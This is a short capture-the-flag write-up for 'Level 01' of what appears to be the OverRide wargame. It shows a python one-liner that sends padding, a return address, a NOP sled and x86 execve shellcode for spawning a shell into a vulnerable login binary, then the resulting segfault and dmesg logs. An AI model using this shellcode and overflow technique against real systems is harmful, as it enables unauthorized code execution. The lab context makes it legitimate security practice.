# Level 01


level01@OverRide:~$ (python -c 'print("dat_wil" + "\n" + "A" * 16 + "\xf0\xd6\xff\xff" + "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x
69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80")'; cat) | /home/users/level01/level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...


Segmentation fault (core dumped)
level01@OverRide:~$ dmesg | grep segfault
[ 4200.301275] level01[1948]: segfault at 90909090 ip 0000000090909090 sp 00000000ffffd700 error 14
[ 4231.743694] level01[1953]: segfault at 90909090 ip 0000000090909090 sp 00000000ffffd700 error 14
[ 4236.990206] level01[1958]: segfault at 90909090 ip 0000000090909090 sp 00000000ffffd700 error 14